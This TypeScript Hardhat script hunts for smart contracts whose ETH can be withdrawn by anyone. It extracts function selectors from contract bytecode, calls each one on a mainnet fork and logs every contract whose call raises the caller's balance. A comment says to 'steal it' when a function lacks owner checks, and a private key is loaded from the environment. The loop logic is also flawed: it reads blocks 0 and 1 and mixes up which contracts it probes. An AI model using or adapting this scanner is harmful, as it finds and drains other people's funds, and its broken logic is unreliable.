import { EVM } from "evm";
import { ethers, network } from 'hardhat'
import * as path from 'path';
import * as dotenv from "dotenv";
import * as _ from 'lodash';
const fs = require('file-system');

let vulnerableFile = 'vulnerableFile.json' 

dotenv.config({ path: path.resolve(__dirname, '.env') })

const provider = new ethers.providers.WebSocketProvider(process.env.ETH_WS_PROVIDER as string)
const signer = new ethers.Wallet(process.env.PRIVATE_KEY as string, provider);

const resetFork = async (blockNumber: number) =>
  network.provider.request({
    method: 'hardhat_reset',
    params: [
      {
        forking: {
          jsonRpcUrl: process.env.ETH_HTTP_PROVIDER,
          blockNumber,
        },
      },
    ],
})

let vulnerableContracts: any[] = [];

async function simulate(blockNumber: number, contract: string, data: string) {
	try {
		console.log('Simulating ...')
		await resetFork(blockNumber)

		const signer =  (await ethers.getSigners())[0]
		const preBal = await signer.getBalance()
		
		const txData = {
			to: contract,
			data: data, // if the function doesn't have `onlyOwner` steal it
			gasPrice: ethers.utils.parseUnits("40", "gwei"),
			gasLimit: 660000,
		}

		let tx = await signer.sendTransaction(txData)
		await tx.wait()

		const postBal = await signer.getBalance()
		const profit =  ethers.utils.formatEther(postBal.sub(preBal))

		console.log(`Profit: `, profit)
		
		if (parseFloat(profit) > 0) {
			console.log(`Vulnerable contract found! ${contract} with free ${profit} ETH. Exposed function ${data}`)
			vulnerableContracts.push(
				{
					"address": contract,
					"data": data,
					"profit": profit	
				}
			)

			fs.writeFileSync(vulnerableFile, JSON.stringify(vulnerableContracts, null, 2), (err: any) => {
				if (err) throw err;
			});
		}

	} catch (err) {
		console.log(err)
	}
}

const run = async () => { 	
	let cont = [
		"0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f", // bad contract
		"0x00000000003b3cc22aF3aE1EAc0440BcEe416B40" // secured contract
	]
	const latestBlockNumber = await provider.getBlockNumber()
	for (let i = 0; i < 2; i++) {
		let block = await provider.getBlockWithTransactions(i)
		
		if (block.transactions.length == 0) 
			continue
		
		let byteCode = await provider.getCode(cont[i]); // Convert the address to bytcode
		const evm = new EVM(byteCode);
		const opcode = evm.getOpcodes(); // Convert the bytecode to opcode
	
		let allPUSH4 = _.filter(opcode, { 'name': 'PUSH4' }) // Get all PUSH4 

		for (const tx of block.transactions) { 
			if (tx.to !== undefined) {
				console.log(`Block: ${block.number} Contract: ${tx.to}`)
				for (const push4 of allPUSH4) {
					const data = '0x' + (push4.pushData).toString('hex') // Convert pushData from Buffer to readable hex string  // 3ccfd60b is a withdraw function sighash
					const getBlockNumber = await provider.getBlockNumber()
					await simulate(getBlockNumber - 5, tx.to, data)
				}
				console.log(`---------------------------------------`)
			}
		}
	}
}

run()
                                                                                              